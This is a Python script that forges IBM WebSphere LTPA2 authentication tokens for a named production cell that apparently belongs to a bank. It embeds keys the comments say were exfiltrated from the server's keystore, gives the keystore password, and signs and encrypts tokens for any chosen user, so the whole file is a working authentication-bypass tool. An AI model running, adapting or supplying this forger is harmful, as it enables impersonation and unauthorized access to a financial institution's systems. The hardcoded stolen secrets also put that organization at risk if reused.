#!/usr/bin/env python3
# LTPA2 token forger - Afirme WAS cell AFBANVLINPRD006Node01Cell
# Keys exfiltrated from ltpa.jceks (storepass: WebAS)
import base64, struct, time, hashlib, sys

try:
    from Crypto.Cipher import DES3
except ImportError:
    print("[!] pip install pycryptodome"); sys.exit(1)

DES3_KEY = base64.b64decode('NQD3uuKrRKDuX/3JeKae/PjDj2hrlYfG')
PRIV = base64.b64decode('AAAAgQCJSGlUzPk9EYeWrfwOKVVOgnahlOQJ+GCkclNSvqjDAwHe4uhCsYvv4AMRxPu6JeTV5MO/Wm/bdBJzDtHTN3rj4QxXuNuUDKau7vSqUcAdS3vJbq5JN7+HqhWgD8M+Os0aqorn0Jks1qUgRM3KnZotNT6iXEi8pKSW2LmkxG2AwQEAAQDupTJHIP/kHRU0743Mc5eGmoFrBDbV+mJPjzv9zP0LOsT0dZ3CSLvNmbAE8w/4jqdInO6kriGxhBMIw+f+mNALANA15qfRUsvxL2b4LYhpbahFBoYGiWPipMaIW6+rugbbjleLlEJDLovybNFIY7iWyzrIdo7dXxqjlJDW+2VWdvE=')
PUB  = base64.b64decode('AMIYeBIPm39ySmzfWo/zpfTuY4qsOrYTQW04+2wL3C2HKvdVaNz2e3lEfKWBS4jwbm5aS1/raC4PHuOnRA/pojSZLly0KK692wPQgyuOLjW/ZchC/1+fc84+jwcOb4DQ072Vy/3TShTfq/vX//VAZhycF8E51fn+3wzcWvRYcuxbAQAB')

# IBM LTPA custom format: PRIV = [4B len][PRIVATE EXPONENT d][3B pubexp][...]
# real modulus comes from PUB blob: [00][128B modulus][010001]
nlen = struct.unpack('>I', PRIV[:4])[0]
d = int.from_bytes(PRIV[4:4+nlen], 'big')
n = int.from_bytes(PUB[1:129], 'big')
e = 65537
# sanity: RSA roundtrip x^(e*d) mod n == x
_x = 4242424242
assert pow(pow(_x, d, n), e, n) == _x, "RSA keypair invalid!"
print(f"[*] RSA-1024 keypair OK (modulus {hex(n)[:18]}...)")

SHA1_DER = bytes.fromhex('3021300906052b0e03021a05000414')

def rsa_sign_sha1(msg: bytes) -> bytes:
    k = (n.bit_length() + 7) // 8
    t = SHA1_DER + hashlib.sha1(msg).digest()
    em = b'\x00\x01' + b'\xff' * (k - len(t) - 3) + b'\x00' + t
    return pow(int.from_bytes(em, 'big'), d, n).to_bytes(k, 'big')

def pkcs7_pad(b: bytes, blk=8) -> bytes:
    p = blk - len(b) % blk
    return b + bytes([p]) * p

def pkcs7_unpad(b: bytes) -> bytes:
    return b[:-b[-1]] if b and 0 < b[-1] <= 8 else b

def forge(user: str, hours=2) -> str:
    expire = int(time.time() * 1000) + hours * 3600 * 1000
    token_data = f"{user}%{expire}"
    sig_b64 = base64.b64encode(rsa_sign_sha1(token_data.encode())).decode()
    token_str = (token_data + "%" + sig_b64).encode()
    ct = DES3.new(DES3_KEY, DES3.MODE_CBC, iv=b'\x00' * 8).encrypt(pkcs7_pad(token_str))
    return base64.b64encode(ct).decode()

def decrypt(token: str):
    ct = base64.b64decode(token)
    pt = DES3.new(DES3_KEY, DES3.MODE_CBC, iv=b'\x00' * 8).decrypt(ct)
    return pkcs7_unpad(pt)

if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "decrypt":
        print(decrypt(sys.argv[2]).decode('utf-8', 'replace'))
    else:
        user = sys.argv[1] if len(sys.argv) > 1 else "uid=wasuser,o=defaultWIMFileBasedRealm"
        tok = forge(user)
        print(f"[+] LtpaToken2 for {user}:")
        print(tok)
        print("[*] roundtrip decrypt check:")
        print("   ", decrypt(tok).decode('utf-8', 'replace')[:120], "...")
